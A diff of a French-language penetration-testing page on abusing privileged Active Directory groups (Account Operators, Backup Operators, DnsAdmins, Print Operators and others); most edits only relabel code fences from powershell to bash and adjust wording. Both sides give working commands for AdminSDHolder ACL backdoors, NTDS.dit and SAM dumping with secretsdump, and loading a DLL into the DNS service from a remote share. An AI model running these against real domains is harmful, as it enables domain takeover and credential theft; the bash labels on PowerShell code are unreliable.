@@ -13,7 +13,7 @@
 Ce groupe est habilité à créer des comptes et des groupes qui ne sont pas des administrateurs sur le domaine. De plus, il permet la connexion locale au Contrôleur de Domaine (DC).
 
 Pour identifier les membres de ce groupe, la commande suivante est exécutée :
-```powershell
+```bash
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
 Ajouter de nouveaux utilisateurs est autorisé, ainsi que la connexion locale à DC01.
@@ -22,10 +22,10 @@ Ajouter de nouveaux utilisateurs est autorisé, ainsi que la connexion locale à
 
 La liste de contrôle d'accès (ACL) du groupe **AdminSDHolder** est cruciale car elle définit les autorisations pour tous les "groupes protégés" au sein d'Active Directory, y compris les groupes à privilèges élevés. Ce mécanisme garantit la sécurité de ces groupes en empêchant les modifications non autorisées.
 
-Un attaquant pourrait exploiter cela en modifiant l'ACL du groupe **AdminSDHolder**, accordant des autorisations complètes à un utilisateur standard. Cela donnerait effectivement à cet utilisateur un contrôle total sur tous les groupes protégés. Si les autorisations de cet utilisateur sont modifiées ou supprimées, elles seraient automatiquement rétablies dans l'heure en raison de la conception du système.
+Un attaquant pourrait exploiter cela en modifiant l'ACL du groupe **AdminSDHolder**, accordant des permissions complètes à un utilisateur standard. Cela donnerait effectivement à cet utilisateur un contrôle total sur tous les groupes protégés. Si les permissions de cet utilisateur sont modifiées ou supprimées, elles seraient automatiquement rétablies dans l'heure en raison de la conception du système.
 
-Les commandes pour examiner les membres et modifier les autorisations incluent :
-```powershell
+Les commandes pour examiner les membres et modifier les permissions incluent :
+```bash
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
@@ -57,10 +57,10 @@ Cette commande révèle que les `Server Operators` ont un accès complet, permet
 L'appartenance au groupe `Backup Operators` donne accès au système de fichiers `DC01` en raison des privilèges `SeBackup` et `SeRestore`. Ces privilèges permettent la traversée de dossiers, le listing et la copie de fichiers, même sans autorisations explicites, en utilisant le drapeau `FILE_FLAG_BACKUP_SEMANTICS`. L'utilisation de scripts spécifiques est nécessaire pour ce processus.
 
 Pour lister les membres du groupe, exécutez :
-```powershell
+```bash
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
-### Attaque Locale
+### Attaque locale
 
 Pour tirer parti de ces privilèges localement, les étapes suivantes sont employées :
 
@@ -85,7 +85,7 @@ L'accès direct au système de fichiers du contrôleur de domaine permet le vol 
 
 #### Using diskshadow.exe
 
-1. Créez une copie de l'ombre du lecteur `C` :
+1. Create a shadow copy of the `C` drive:
 ```cmd
 diskshadow.exe
 set verbose on
@@ -111,7 +111,7 @@ robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-4. Récupérer tous les hachages de `NTDS.dit`:
+4. Récupérer tous les hashes de `NTDS.dit`:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
@@ -133,13 +133,13 @@ Pour une démonstration pratique, voir [VIDÉO DE DÉMO AVEC IPPSEC](https://www
 Les membres du groupe **DnsAdmins** peuvent exploiter leurs privilèges pour charger une DLL arbitraire avec des privilèges SYSTEM sur un serveur DNS, souvent hébergé sur des contrôleurs de domaine. Cette capacité permet un potentiel d'exploitation significatif.
 
 Pour lister les membres du groupe DnsAdmins, utilisez :
-```powershell
+```bash
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 ### Exécuter un DLL arbitraire
 
 Les membres peuvent faire en sorte que le serveur DNS charge un DLL arbitraire (soit localement, soit à partir d'un partage distant) en utilisant des commandes telles que :
-```powershell
+```bash
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
@@ -167,7 +167,7 @@ Pour plus de détails sur ce vecteur d'attaque, référez-vous à ired.team.
 
 #### Mimilib.dll
 
-Il est également possible d'utiliser mimilib.dll pour l'exécution de commandes, en le modifiant pour exécuter des commandes spécifiques ou des shells inversés. [Consultez ce post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) pour plus d'informations.
+Il est également possible d'utiliser mimilib.dll pour l'exécution de commandes, en le modifiant pour exécuter des commandes spécifiques ou des shells inversés. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) pour plus d'informations.
 
 ### Enregistrement WPAD pour MitM
 
@@ -175,7 +175,7 @@ Les DnsAdmins peuvent manipuler les enregistrements DNS pour effectuer des attaq
 
 ### Lecteurs de journaux d'événements
 Les membres peuvent accéder aux journaux d'événements, trouvant potentiellement des informations sensibles telles que des mots de passe en clair ou des détails d'exécution de commandes :
-```powershell
+```bash
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
@@ -183,7 +183,7 @@ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Va
 ## Permissions Windows d'Exchange
 
 Ce groupe peut modifier les DACL sur l'objet de domaine, accordant potentiellement des privilèges DCSync. Les techniques d'escalade de privilèges exploitant ce groupe sont détaillées dans le dépôt GitHub Exchange-AD-Privesc.
-```powershell
+```bash
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
@@ -199,28 +199,28 @@ Le service de maintenance de Mozilla Firefox peut être exploité par les admini
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-Note : L'exploitation des liens durs a été atténuée dans les mises à jour récentes de Windows.
+Note: L'exploitation des liens durs a été atténuée dans les mises à jour récentes de Windows.
 
-## Gestion de l'organisation
+## Gestion de l'Organisation
 
-Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial connu sous le nom de **Gestion de l'organisation** détient des capacités significatives. Ce groupe a le privilège **d'accéder aux boîtes aux lettres de tous les utilisateurs du domaine** et maintient **un contrôle total sur l'Unité d'Organisation 'Groupes de sécurité Microsoft Exchange'**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour l'escalade de privilèges.
+Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial connu sous le nom de **Gestion de l'Organisation** détient des capacités significatives. Ce groupe a le privilège d'**accéder aux boîtes aux lettres de tous les utilisateurs du domaine** et maintient **un contrôle total sur l'Unité Organisationnelle (OU) 'Groupes de Sécurité Microsoft Exchange'**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour l'escalade de privilèges.
 
-### Exploitation des privilèges et commandes
+### Exploitation des Privilèges et Commandes
 
-#### Opérateurs d'impression
+#### Opérateurs d'Impression
 
-Les membres du groupe **Opérateurs d'impression** sont dotés de plusieurs privilèges, y compris le **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un contrôleur de domaine**, de l'éteindre et de gérer les imprimantes. Pour exploiter ces privilèges, surtout si **`SeLoadDriverPrivilege`** n'est pas visible dans un contexte non élevé, il est nécessaire de contourner le Contrôle de compte d'utilisateur (UAC).
+Les membres du groupe **Opérateurs d'Impression** sont dotés de plusieurs privilèges, y compris le **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un Contrôleur de Domaine**, de l'éteindre et de gérer les imprimantes. Pour exploiter ces privilèges, surtout si **`SeLoadDriverPrivilege`** n'est pas visible dans un contexte non élevé, il est nécessaire de contourner le Contrôle de Compte Utilisateur (UAC).
 
 Pour lister les membres de ce groupe, la commande PowerShell suivante est utilisée :
-```powershell
+```bash
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
 Pour des techniques d'exploitation plus détaillées liées à **`SeLoadDriverPrivilege`**, il convient de consulter des ressources de sécurité spécifiques.
 
 #### Utilisateurs de Bureau à Distance
 
-Les membres de ce groupe ont accès aux PC via le Protocole de Bureau à Distance (RDP). Pour énumérer ces membres, des commandes PowerShell sont disponibles :
-```powershell
+Les membres de ce groupe se voient accorder l'accès aux PC via le protocole de bureau à distance (RDP). Pour énumérer ces membres, des commandes PowerShell sont disponibles :
+```bash
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
@@ -229,7 +229,7 @@ Des informations supplémentaires sur l'exploitation de RDP peuvent être trouv�
 #### Utilisateurs de gestion à distance
 
 Les membres peuvent accéder aux PC via **Windows Remote Management (WinRM)**. L'énumération de ces membres est réalisée par :
-```powershell
+```bash
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
@@ -238,7 +238,7 @@ Pour les techniques d'exploitation liées à **WinRM**, une documentation spéci
 #### Opérateurs de serveur
 
 Ce groupe a des permissions pour effectuer diverses configurations sur les contrôleurs de domaine, y compris des privilèges de sauvegarde et de restauration, le changement de l'heure système et l'arrêt du système. Pour énumérer les membres, la commande fournie est :
-```powershell
+```bash
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
 ## Références <a href="#references" id="references"></a>
